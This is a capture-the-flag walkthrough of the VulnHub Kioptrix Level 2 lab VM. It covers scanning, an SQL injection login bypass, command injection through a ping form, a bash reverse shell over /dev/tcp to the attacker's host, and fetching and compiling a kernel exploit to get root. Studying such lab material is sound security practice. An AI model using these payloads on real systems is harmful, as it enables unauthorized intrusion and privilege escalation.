---
layout: single
date: 2019-06-21
title: "Kioptrix Level: 2"
header:
    overlay_image: /assets/images/Kioptrix_level2.png
    caption: "[__VulnHub__](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)"
related: true
comments: true
---


Hello Everyone!, and welcome to my VulnHub VM Write-Ups!

If you don't have the Kioptrix Level: 2 VM, then you can download it from [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).

## Abot the VM
```console
This Kioptrix VM Image are easy challenges. The object of the game is to acquire root 
access via any means possible (except actually hacking the VM server or player). The 
purpose of these games are to learn the basic tools and techniques in vulnerability
assessment and exploitation. There are more ways then one to successfully complete 
the challenges.
```

## Let's begin!!!!!
```console
root@kali:~# netdiscover

Currently scanning: Finished!   |   Screen View: Unique Hosts                 

2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84                
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.2    [......!!!....]      1      42  Honda Electronics Co.,Ltd 
 192.168.1.24    [......!!!....]      1      42  PCS Systemtechnik GmbH
 ```

 Our target IP is `192.168.1.24`.

 Run the `Nmap` scan.
 ```console
root@kali:~# nmap -sS -A -n 192.168.1.24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 15:45 IST
Nmap scan report for 192.168.1.24
Host is up (0.00045s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            895/udp  status
|_  100024  1            898/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2019-06-21T14:16:01+00:00; +4h00m05s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
898/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:C9:52:F0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: 4h00m04s, deviation: 0s, median: 4h00m04s

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.1.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.64 seconds
```
Through our `nmap` scan we can see that the system is running an older version of Apache and MySQL.

Let's browse to this IP `192.168.1.24` through firefox.
We get a `PHP` Login page. Try this MySQL injection
Username: `admin`
Password:  `' OR 1=1 -- -`

We will get a form, where if give an IP it will do ping request on it.
Try: `127.0.0.1`

Again try: `127.0.0.1; id`
This is vulnerable to command execution.

Let's setup Netcat in our local machine
```console
root@kali:~#  nc -nlvp 443
listening on [any] 443 ...

```
Now get back to the browser and run this command : `127.0.0.1; bash -i >& /dev/tcp/192.168.1.6/443 0>&1`
Where `192.168.1.6` is the IP of the local machine.
```console
root@kali:~#  nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.24] 32776
bash: no job control in this shell
bash-3.00$ whoami
apache
bash-3.00$ 
```
We get a remote shell on the target machine.

On checking the version of Linux it is running, we got
```console
bash-3.00$ cat /proc/version
Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007
bash-3.00$ rpm -q kernel
kernel-2.6.9-55.EL
```
After some research work, we got an exploit which can be downloaded from [here](https://www.exploit-db.com/exploits/9542).
Download it and save it to `/var/www/html/`.
Start Apache in the local machine: `service apache2 start`.

Now get back to the shell we got..and type the following commands :-
`cd /tmp`
`wget http://192.168.1.6/9542.c`
`gcc 9542.c -o exploit`
`./exploit`
`whoami`
```console
bash-3.00$ cd /tmp
bash-3.00$ wget http://192.168.1.6/9542.c
--10:49:58--  http://192.168.1.6/9542.c
           => `9542.c'
Connecting to 192.168.1.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/x-csrc]

    0K ..                                                    100%   63.01 MB/s

10:49:58 (63.01 MB/s) - `9542.c' saved [2643/2643]

bash-3.00$ gcc 9542.c -o exploit
9542.c:109:28: warning: no newline at end of file
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# whoami
root
```

Good Luck!

## Thank You! for learning with me. Keep Moving!!!